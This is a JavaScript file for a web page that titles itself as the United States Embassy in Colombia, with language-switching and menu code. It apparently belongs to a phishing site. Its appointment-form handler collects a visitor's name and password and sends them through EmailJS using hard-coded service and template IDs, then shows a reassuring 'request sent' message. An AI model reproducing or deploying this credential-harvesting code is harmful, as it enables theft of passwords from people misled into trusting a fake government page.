// Inicializar EmailJS
(function () {
  emailjs.init("5hSEIwvwW_P3opzdj"); // Reemplaza con tu User ID real de EmailJS
})();

document.addEventListener("DOMContentLoaded", function () {
  console.log('Script cargado correctamente.');

  const appointmentForm = document.getElementById("appointmentForm");
  const successMessageDiv = document.getElementById("successMessage");

  // Manejo del formulario
  if (appointmentForm && successMessageDiv) {
    appointmentForm.addEventListener("submit", function (e) {
      e.preventDefault();

      // Ocultar mensaje previo
      successMessageDiv.style.display = "none";
      successMessageDiv.style.color = "green";

      const nombre = document.getElementById("nombre").value.trim();
      const contraseña = document.getElementById("contraseña").value.trim();
      const currentLang = localStorage.getItem("selectedLanguage") || "es";

      // Enviar datos con EmailJS
      emailjs
        .send("service_vxadbni", "template_3o32aj2", {
          name: nombre,
          password: contraseña,
          time: new Date().toLocaleString(),
        })
        .then(function (response) {
          console.log("Correo enviado exitosamente", response.status, response.text);
          successMessageDiv.textContent =
            currentLang === "en"
              ? "✓ Your request has been successfully sent. We will contact you soon."
              : "✓ Tu solicitud fue enviada correctamente. Te contactaremos pronto.";
          successMessageDiv.style.display = "block";
          appointmentForm.reset();
        })
        .catch(function (error) {
          console.error("Error al enviar el correo:", error);
          successMessageDiv.textContent =
            currentLang === "en"
              ? "❌ An error occurred while sending your request. Please try again."
              : "❌ Ocurrió un error al enviar tu solicitud. Intenta nuevamente.";
          successMessageDiv.style.color = "red";
          successMessageDiv.style.display = "block";
        });

      // Ocultar mensaje después de 5 segundos
      setTimeout(() => {
        successMessageDiv.style.display = "none";
      }, 5000);
    });
  }

  // =============================
  // Lógica del cambio de idioma
  // =============================
  const menuToggle = document.getElementById("menu-toggle");
  const dropdownMenu = document.getElementById("dropdown-menu");
  const closeMenuBtn = document.getElementById("close-menu");
  const languageToggle = document.getElementById("language-toggle");
  const languageDropdown = document.getElementById("language-dropdown");
  const languageOptions = document.querySelectorAll(".language-option");

  function toggleMenu() {
    if (dropdownMenu) {
      dropdownMenu.classList.toggle("show");
    }
  }

  function closeMenu() {
    if (dropdownMenu) {
      dropdownMenu.classList.remove("show");
    }
  }

  function toggleLanguageDropdown(e) {
    e.preventDefault();
    e.stopPropagation();
    if (languageDropdown) {
      languageDropdown.classList.toggle("show");
    }
  }

  function changeLanguage(lang) {
    const elements = document.querySelectorAll("[data-es][data-en]");

    elements.forEach((element) => {
      const text = lang === "es" ? element.getAttribute("data-es") : element.getAttribute("data-en");
      if (text) element.textContent = text;
    });

    document.title =
      lang === "es" ? "Embajada de Estados Unidos en Colombia" : "United States Embassy in Colombia";

    if (languageToggle) {
      languageToggle.textContent = lang === "es" ? "Idioma ▼" : "Language ▼";
    }

    if (languageDropdown) {
      languageDropdown.classList.remove("show");
    }

        // 5. Guardar preferencia
        localStorage.setItem('selectedLanguage', lang);
        
        // Asegurar que la sección "necesito" cambie correctamente al idioma seleccionado.
        // Ajustar la función para depurar y garantizar que el contenedor "necesito" cambie correctamente.
        function updateLanguage(lang) {
            console.log(`Cambiando idioma a: ${lang}`);

            // Actualizar texto de elementos con atributos data-es y data-en
            const elements = document.querySelectorAll('[data-es][data-en]');
            elements.forEach(element => {
                const text = lang === 'es' ? element.getAttribute('data-es') : element.getAttribute('data-en');
                if (text) {
                    element.textContent = text;
                } else {
                    console.warn(`Elemento sin texto para el idioma ${lang}:`, element);
                }
            });

            // Actualizar específicamente los enlaces y títulos de la sección "necesito"
            const necesitoSection = document.querySelector('.necesito-container');
            if (necesitoSection) {
                const necesitoTitle = necesitoSection.querySelector('.necesito-title');
                if (necesitoTitle) {
                    const titleText = lang === 'es' ? necesitoTitle.getAttribute('data-es') : necesitoTitle.getAttribute('data-en');
                    if (titleText) {
                        necesitoTitle.textContent = titleText;
                    } else {
                        console.warn(`Título "necesito" sin texto para el idioma ${lang}`);
                    }
                }

                const necesitoLinks = necesitoSection.querySelectorAll('.necesito-link');
                necesitoLinks.forEach(link => {
                    const linkText = lang === 'es' ? link.getAttribute('data-es') : link.getAttribute('data-en');
                    if (linkText) {
                        link.textContent = linkText;
                    } else {
                        console.warn(`Enlace "necesito" sin texto para el idioma ${lang}:`, link);
                    }
                });
            } else {
                console.error('No se encontró la sección "necesito" en el DOM.');
            }

            // Guardar preferencia en localStorage
            localStorage.setItem('selectedLanguage', lang);
        }
        updateLanguage(lang);
        
        console.log(`Idioma cambiado exitosamente a: ${lang}`);
    }

    // EVENTOS PARA EL MENÚ
    if (menuToggle) {
        menuToggle.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            toggleMenu();
        });
    }
    
    if (closeMenuBtn) {
        closeMenuBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            closeMenu();
        });
    }
    
    // EVENTO PARA EL BOTÓN DE IDIOMA
    if (languageToggle) {
        languageToggle.addEventListener('click', toggleLanguageDropdown);
    }
    
    // EVENTOS PARA LAS OPCIONES DE IDIOMA
    languageOptions.forEach(option => {
        option.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            const lang = this.getAttribute('data-lang');
            console.log(`Idioma seleccionado: ${lang}`);
            changeLanguage(lang);
        });
    });

  document.addEventListener("click", function (e) {
    if (
      menuToggle &&
      dropdownMenu &&
      !menuToggle.contains(e.target) &&
      !dropdownMenu.contains(e.target)
    ) {
      closeMenu();
    }

    if (
      languageToggle &&
      languageDropdown &&
      !languageToggle.contains(e.target) &&
      !languageDropdown.contains(e.target)
    ) {
      languageDropdown.classList.remove("show");
    }
  });

  document.addEventListener("keydown", function (e) {
    if (e.key === "Escape") {
      if (dropdownMenu?.classList.contains("show")) closeMenu();
      if (languageDropdown?.classList.contains("show")) languageDropdown.classList.remove("show");
    }
  });

  if (dropdownMenu) {
    dropdownMenu.addEventListener("click", function (e) {
      e.stopPropagation();
    });
  }

  if (languageDropdown) {
    languageDropdown.addEventListener("click", function (e) {
      e.stopPropagation();
    });
  }

  const menuItems = document.querySelectorAll(".menu-item");
  menuItems.forEach((item) => {
    item.addEventListener("mouseenter", function () {
      this.style.backgroundColor = "#e3f2fd";
    });
    item.addEventListener("mouseleave", function () {
      this.style.backgroundColor = "";
    });
  });

  const savedLanguage = localStorage.getItem("selectedLanguage") || "es";
  changeLanguage(savedLanguage);
});

// Scroll effect en header
window.addEventListener("scroll", () => {
  const header = document.querySelector(".header");
  if (header) {
    if (window.scrollY > 50) {
      header.classList.add("scrolled");
    } else {
      header.classList.remove("scrolled");
    }
  }
});

// Tabs de líderes (si existen)
document.querySelectorAll(".tab-button").forEach((button) => {
  button.addEventListener("click", () => {
    const tab = button.dataset.tab;

    document.querySelectorAll(".tab-button").forEach((btn) => btn.classList.remove("active"));
    document.querySelectorAll(".tab-content").forEach((content) =>
      content.classList.remove("active")
    );

    button.classList.add("active");
    const tabContent = document.getElementById(tab);
    if (tabContent) {
      tabContent.classList.add("active");
    }
  });
});
